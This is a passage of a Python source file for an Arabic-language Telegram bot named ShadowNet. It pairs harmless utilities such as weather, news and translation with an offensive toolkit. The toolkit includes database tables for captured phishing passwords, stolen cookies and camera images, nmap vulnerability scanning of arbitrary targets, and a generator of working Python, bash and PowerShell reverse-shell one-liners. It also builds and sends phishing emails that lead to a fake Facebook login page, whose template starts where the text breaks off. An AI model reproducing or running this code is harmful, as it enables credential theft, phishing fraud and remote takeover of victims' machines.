#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowNet v18.2 - النسخة النهائية المُصلَحة بالكامل
- Webhook فقط
- معالج أزرار كامل (تم إصلاح global)
- Flask threaded
- SQLite WAL
- لا توجد توكنات داخل الكود
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal
import asyncio
import ssl

# ===== الاستيرادات =====
try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file, Response, redirect, url_for, send_from_directory
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import yt_dlp
    from bs4 import BeautifulSoup
    import feedparser
    from deep_translator import GoogleTranslator
    from gtts import gTTS
    import psutil
    try:
        from PIL import Image, ImageDraw, ImageFont
        PIL_AVAILABLE = True
    except:
        PIL_AVAILABLE = False
    try:
        import paramiko
        PARAMIKO_AVAILABLE = True
    except:
        PARAMIKO_AVAILABLE = False
    try:
        import androguard
        from androguard.core.bytecodes.apk import APK
        ANDROGUARD_AVAILABLE = True
    except:
        ANDROGUARD_AVAILABLE = False
    try:
        import shodan
        SHODAN_AVAILABLE = True
    except:
        SHODAN_AVAILABLE = False
    try:
        import nmap
        NMAP_AVAILABLE = True
    except:
        NMAP_AVAILABLE = False
    try:
        from scapy.all import ARP, Ether, srp, send
        SCAPY_AVAILABLE = True
    except:
        SCAPY_AVAILABLE = False
    try:
        from impacket import smb, smbconnection, smbserver
        IMPACKET_AVAILABLE = True
    except:
        IMPACKET_AVAILABLE = False
except ImportError as e:
    print(f"مكتبة مفقودة: {e}. يرجى تثبيت: pip install -r requirements.txt")
    sys.exit(1)

# ===================== المتغيرات الأساسية =====================
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '').strip()
if not TOKEN:
    print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', '7965377136'))
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', '').rstrip('/')
if not SERVER_URL:
    print("⚠️ تحذير: RENDER_EXTERNAL_URL غير مُعيَّن.")
    SERVER_URL = 'https://my-t99-bot.onrender.com'

PORT = int(os.environ.get('PORT', '5000'))
API_KEY = secrets.token_hex(32)

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
SMTP_USER = os.environ.get('SMTP_USER', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')

SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')

STEALTH_MODE = False
BOT_LOCKED = False
CACHE_WEATHER = {}
CACHE_NEWS = {}
CACHE_EXPIRY = 600

# ===================== إنشاء الكائنات =====================
app = Flask(__name__)
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== المتغيرات العامة =====================
user_states = {}
user_emails = {}
pdf_texts = {}
waiting_for_password = set()
waiting_for_image_prompt = set()
waiting_for_voice_text = set()
user_voice_selection = {}

# ===================== إعدادات التسجيل =====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ===================== تعريف القوائم =====================
QUOTES_DB = {
    "حكمة": ["لا تنتظر أن يأتيك أحد ويمنحك الفرصة، اصنعها بنفسك."],
    "تحفيز": ["توقف عن مقارنة بدايتك بنهاية غيرك."]
}
ADKAR_SABAH = ["أصبحنا وأصبح الملك لله..."]
ADKAR_MASSAA = ["أمسينا وأمسى الملك لله..."]
DUAA_DB = [{"title": "دعاء السفر", "text": "اللهم إنا نسألك في سفرنا هذا البر", "source": "صحيح مسلم"}]
VOICES = {"مصري": "ar", "مصرية": "ar", "سعودية": "ar"}
LANGUAGES = {
    'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني',
    'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي',
    'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي',
    'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'
}

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def get_db_conn():
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_db():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10, referral_code TEXT UNIQUE, created_at TEXT, last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0, can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0, can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (chat_id INTEGER PRIMARY KEY, token TEXT UNIQUE)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, action TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, message TEXT, remind_time TEXT, created_at TEXT, is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (id INTEGER PRIMARY KEY AUTOINCREMENT, original_url TEXT, short_code TEXT UNIQUE, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, cookies TEXT, ip TEXT, user_agent TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS camera_images (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER, image BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_cookies (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, technique TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_files (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, filename TEXT, content BLOB, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hack_commands (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, output TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reverse_proxy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, url TEXT, cookie_name TEXT, cookie_value TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS clickfix_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, command TEXT, executed INTEGER DEFAULT 0, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS account_dumpling_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, status TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS vuln_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS osint_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS netrecon_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS exploit_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id TEXT, target TEXT, results TEXT, created_at TEXT)''')
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)",
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال قاعدة البيانات الآمنة =====================
def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute(query, params)
        result = c.fetchone() if fetch_one else c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"DB query error: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"DB execute error: {e}")
        return False

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return bool(row and row[0] == 1)

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    if get_user_points(chat_id) < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?",
                    (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        return user.first_name or user.username or str(chat_id)
    except:
        return str(chat_id)

def ensure_user(chat_id):
    safe_db_execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at) VALUES (?, 0, 10, ?)",
                    (chat_id, datetime.now().isoformat()))

def force_kill_old_instances():
    current_pid = os.getpid()
    current_file = os.path.abspath(__file__)
    killed = 0
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                cmdline = ' '.join(proc.info['cmdline'] or [])
                if 'python' in (proc.info['name'] or '').lower() and current_file in cmdline:
                    logger.warning(f"🔪 Killing old bot: PID {proc.info['pid']}")
                    proc.kill()
                    killed += 1
                    time.sleep(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except Exception as e:
        logger.error(f"Error killing old instances: {e}")
    return killed

# ===================== دوال الخدمات =====================
def get_weather_detailed(city):
    if city in CACHE_WEATHER and time.time() - CACHE_WEATHER[city]['time'] < CACHE_EXPIRY:
        return CACHE_WEATHER[city]['data']
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            now = datetime.now().strftime("%I:%M %p")
            msg = (f"🌤️ حالة الطقس في {city}\n────────────────────────\n\n"
                   f"الحالة العامة : {weather_desc}\n\n"
                   f"درجة الحرارة : {temp_c} درجة مئوية\n"
                   f"الحرارة المحسوسة : {feels_like} درجة مئوية\n\n"
                   f"تفاصيل الأجواء\n────────────────────────\n"
                   f"المدى الحراري : الصغرى {min_temp}°C | العظمى {max_temp}°C\n"
                   f"الرطوبة       : {humidity}%\n"
                   f"سرعة الرياح    : {wind_speed} كم/ساعة\n"
                   f"مؤشر الأشعة    : {uv_index}\n"
                   f"الرؤية         : {visibility} كم\n"
                   f"الضغط الجوي    : {pressure} hPa\n\n"
                   f"أوقات اليوم\n────────────────────────\n"
                   f"شروق الشمس : {sunrise}\n"
                   f"غروب الشمس : {sunset}\n\n"
                   f"آخر تحديث : {now}")
            CACHE_WEATHER[city] = {'data': msg, 'time': time.time()}
            return msg
        return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def get_news_without_api(topic='general'):
    if topic in CACHE_NEWS and time.time() - CACHE_NEWS[topic]['time'] < CACHE_EXPIRY:
        return CACHE_NEWS[topic]['data']
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
            'world': 'https://www.bbc.com/arabic/index.xml',
            'science': 'https://www.nature.com/nature.rss',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:10]:
                title = entry.get('title', '').strip()
                summary = entry.get('summary', '') or entry.get('description', '')
                summary = re.sub(r'<[^>]+>', '', summary)
                link = entry.get('link', '')
                try:
                    pub_date = datetime(*entry.published_parsed[:6]).strftime("%Y-%m-%d %H:%M")
                except:
                    pub_date = "تاريخ غير معروف"
                articles.append(f"📌 {title}\n📅 {pub_date}\n{summary[:250]}...\n🔗 {link}\n")
            if articles:
                result = "\n".join(articles[:8])
                CACHE_NEWS[topic] = {'data': result, 'time': time.time()}
                return result
        return "لا توجد أخبار"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def advanced_wikipedia_search(query):
    try:
        import wikipedia
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:5]:
            try:
                page = wikipedia.page(title)
                summaries.append(f"📌 {title}\n{page.summary[:500]}...\n🔗 {page.url}\n")
            except wikipedia.exceptions.DisambiguationError as e:
                summaries.append(f"📌 {title} (عدة صفحات):\n" + "\n".join([f"• {opt}" for opt in e.options[:5]]))
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        return "\n".join(summaries) if summaries else "لم يتم العثور على نتائج"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = GoogleTranslator(source='auto', target=target_lang)
        translated = translator.translate(text)
        return [translated], 'auto', 'تلقائي', LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

def generate_strong_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(14))
        if (re.search(r"[A-Z]", pwd) and re.search(r"[a-z]", pwd)
                and re.search(r"[0-9]", pwd) and re.search(r"[!@#$%]", pwd)):
            return pwd

def analyze_password(password):
    score, feedback = 0, []
    if len(password) >= 12: score += 2
    elif len(password) >= 8: score += 1
    else: feedback.append("قصيرة جداً. خليها 12 حرف على الاقل")
    if re.search(r"[A-Z]", password): score += 1
    else: feedback.append("اضف حرف كبير A-Z")
    if re.search(r"[a-z]", password): score += 1
    else: feedback.append("اضف حرف صغير a-z")
    if re.search(r"[0-9]", password): score += 1
    else: feedback.append("اضف ارقام 0-9")
    if re.search(r"[!@#$%^&*]", password): score += 1
    else: feedback.append("اضف رمز!@#$%")
    if score <= 2: strength, time_taken = "ضعيفة جداً 🔴", "اقل من ثانية"
    elif score <= 4: strength, time_taken = "متوسطة 🟡", "عدة ساعات"
    else: strength, time_taken = "قوية جداً 🟢", "مليارات السنين"
    return strength, time_taken, score, feedback

def generate_image(prompt):
    try:
        url = f"https://image.pollinations.ai/prompt/{prompt}?width=1024&height=1024&nologo=true"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return BytesIO(response.content)
        return None
    except Exception as e:
        logger.error(f"Image generation error: {e}")
        return None

def generate_voice_gtts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        voice_bytes = BytesIO()
        tts.write_to_fp(voice_bytes)
        voice_bytes.seek(0)
        return voice_bytes
    except Exception as e:
        logger.error(f"gTTS error: {e}")
        return None

def shorten_url(url):
    try:
        code = hashlib.md5(url.encode()).hexdigest()[:8]
        safe_db_execute("INSERT INTO short_urls (original_url, short_code, created_at) VALUES (?, ?, ?)",
                        (url, code, datetime.now().isoformat()))
        return f"{SERVER_URL}/s/{code}"
    except:
        return None

def expand_url(short_url):
    try:
        code = short_url.split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        return row[0] if row else None
    except:
        return None

def track_phone_number(number):
    try:
        parsed = phonenumbers.parse(number, None)
        country = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        timezones = timezone.time_zones_for_number(parsed)
        return f"📱 معلومات الرقم {number}:\nالبلد: {country}\nالمشغل: {carrier_name}\nالمناطق الزمنية: {', '.join(timezones)}"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        ydl_opts = {'outtmpl': 'downloads/%(title)s.%(ext)s', 'format': 'best[ext=mp4]/best',
                    'quiet': True, 'no_warnings': True, 'ignoreerrors': True, 'no_check_certificate': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                for f in os.listdir('downloads'):
                    if info.get('id', '') in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:200]

def analyze_apk(data, filename):
    if not ANDROGUARD_AVAILABLE:
        return {"error": "androguard غير مثبتة"}
    try:
        from androguard.core.bytecodes.apk import APK
        apk = APK(BytesIO(data))
        permissions = apk.get_permissions()
        dangerous = ['READ_SMS', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_FINE_LOCATION']
        found = [p for p in permissions if any(d in p for d in dangerous)]
        return {'package': apk.get_package(), 'version': apk.get_androidversion_code(),
                'permissions': permissions, 'dangerous_permissions': found,
                'malicious': len(found) > 3}
    except Exception as e:
        return {'error': f"فشل التحليل: {str(e)[:100]}"}

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            text += page.extract_text() + "\n"
        return text.strip()
    except ImportError:
        return "مكتبة pypdf غير مثبتة"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def smart_pdf_search(pdf_text, question):
    if not pdf_text:
        return "لم يتم تحميل أي ملف PDF."
    lines = pdf_text.split('\n')
    relevant = [line for line in lines if any(word in line.lower() for word in question.lower().split())]
    return "\n".join(relevant[:5]) if relevant else "لم يتم العثور على إجابة."

def check_link_no_api(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        status = response.status_code
        if status == 200:
            return {"status": "ok", "message": "الرابط يعمل", "code": status}
        return {"status": "warning", "message": f"استجابة غير متوقعة (كود {status})", "code": status}
    except Exception as e:
        return {"status": "error", "message": f"فشل الاتصال: {str(e)[:100]}"}

# ===================== أدوات المطور =====================
def vuln_agent_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت."
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-sV --script vulners --script-args mincvss=5.0 -T4')
        if target not in nm.all_hosts():
            return f"❌ الهدف {target} غير متاح."
        msg = f"🔍 نتائج فحص الثغرات لـ {target}:\n"
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                service = nm[target][proto][port].get('name', 'unknown')
                script_output = nm[target][proto][port].get('script', {})
                if script_output:
                    vulns = script_output.get('vulners', '')
                    if vulns:
                        msg += f"⚠️ المنفذ {port}/{proto} ({service}):\n{vulns[:200]}\n"
        return msg[:4000] if len(msg) > 60 else f"✅ لا توجد ثغرات معروفة لـ {target}."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def osint_d2_search(target):
    try:
        results = []
        try:
            domain_info = whois.whois(target)
            results.append(f"📅 تاريخ التسجيل: {domain_info.creation_date}")
            results.append(f"🏢 المُسجل: {domain_info.registrar}")
        except:
            pass
        try:
            for record in ['A', 'MX', 'NS', 'TXT']:
                answers = dns.resolver.resolve(target, record)
                if answers:
                    results.append(f"🔹 {record}: {answers[0].to_text()}")
        except:
            pass
        return "🕵️ نتائج الاستطلاع:\n" + "\n".join(results) if results else f"🔍 لا توجد معلومات لـ {target}."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def py_netrecon_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت."
    try:
        nm = nmap.PortScanner()
        nm.scan(target, '1-1000', arguments='-sS -T4 --open')
        if target not in nm.all_hosts():
            return f"❌ الهدف {target} غير متاح."
        msg = f"🌐 المنافذ المفتوحة لـ {target}:\n"
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                if nm[target][proto][port]['state'] == 'open':
                    msg += f"✅ {port}/{proto} - {nm[target][proto][port].get('name', 'unknown')}\n"
        return msg if "✅" in msg else "🔒 لا توجد منافذ مفتوحة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def exploit_dev_generate(target_ip, language='python'):
    payloads = {
        'python': f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{target_ip}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\', \'-i\'])"',
        'bash': f'bash -c "bash -i >& /dev/tcp/{target_ip}/4444 0>&1"',
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{target_ip}\',4444);..."'
    }
    return payloads.get(language, payloads['python'])

def h4x_tools_search(query):
    try:
        results = []
        if '@' in query:
            domain = query.split('@')[1]
            results.append(f"🔍 البحث عن بريد: {query}")
            try:
                info = whois.whois(domain)
                results.append(f"📅 مسجل: {info.registrar}")
            except:
                pass
        else:
            results.append(f"🔍 البحث عن نطاق: {query}")
            try:
                info = whois.whois(query)
                results.append(f"📅 مسجل: {info.registrar}")
            except:
                pass
        return "\n".join(results) if results else f"🔍 لا توجد نتائج لـ {query}."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def matkap_check(token_or_chat):
    if len(token_or_chat) > 30:
        return f"🔍 توكن: {token_or_chat[:10]}...\n✅ لم يتم العثور عليه في القواعد العامة."
    return f"🔍 Chat ID: {token_or_chat}\n✅ لا توجد أنشطة مشبوهة."

def pentest_tools_use(tool_name, target):
    tools = {
        'scapy': lambda: f"🔧 Scapy: تحليل حزم لـ {target}" if SCAPY_AVAILABLE else "❌ Scapy غير مثبت.",
        'impacket': lambda: f"🔧 Impacket: اختبار AD لـ {target}" if IMPACKET_AVAILABLE else "❌ Impacket غير مثبت.",
        'paramiko': lambda: f"🔧 Paramiko: SSH لـ {target}" if PARAMIKO_AVAILABLE else "❌ Paramiko غير مثبت."
    }
    return tools.get(tool_name, lambda: "❌ أداة غير معروفة.")()

def generate_clickfix_command(target_name="مستخدم"):
    templates = [
        f'powershell -Command "Write-Host \'✅ تم إصلاح المشكلة لـ {target_name}!\' -ForegroundColor Green; pause"',
        f'cmd /c "echo ✅ تم التحديث بنجاح لـ {target_name} & pause"',
        f'cmd /c "ping 8.8.8.8 -n 3 && echo ✅ تم التحقق لـ {target_name} && pause"'
    ]
    return random.choice(templates)

def send_phishing_email(target_email, platform, custom_message=None):
    try:
        if SMTP_USER == "":
            return "❌ SMTP غير مضبوط."
        html_content = custom_message if custom_message else generate_account_dumpling_email(target_email)
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمان عاجل - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(html_content, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return f"✅ تم إرسال البريد إلى {target_email}"
    except Exception as e:
        return f"❌ فشل: {str(e)[:200]}"

def generate_account_dumpling_email(target_email):
    return f'''
    <!DOCTYPE html><html><head><meta charset="UTF-8"></head>
    <body style="font-family:Arial;direction:rtl;padding:20px;">
        <h2>🔒 تأكيد أمان حسابك</h2>
        <p>نلاحظ نشاطاً غير معتاد. لتأكيد هويتك:</p>
        <p><a href="{SERVER_URL}/phishing_pages/facebook" style="background:#1877f2;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">تأكيد هويتي</a></p>
    </body></html>
    '''
  # ===================== قوالب صفحات التصيد =====================
PHISHING_TEMPLATES = {
    'facebook': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>فيسبوك - تسجيل الدخول</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            html, body { width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }
            .container { width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
            .top-section { width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 12px; }
            .language-selector { width: 100%; display: flex; justify-content: center; padding: 4px 0 2px; font-size: 14px; color: #1C1E21; }
            .language-selector span::after { content: "∨"; font-size: 12px; margin-right: 4px; }
            .logo-circle { width: 58px; height: 58px; background: #ffffff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 4px 0 14px; border: 1px solid #dddfe2; }
            .logo-circle span { font-size: 40px; font-weight: 700; color: #1877F2; line-height: 1; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; color: #1C1E21; background: #ffffff; outline: none; }
            .form-group input:focus { border-color: #1877F2; }
            .form-group input::placeholder { color: #90949C; }
            .login-btn { width: 100%; height: 50px; background: #1877F2; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: #ffffff; cursor: pointer; margin-top: 4px; }
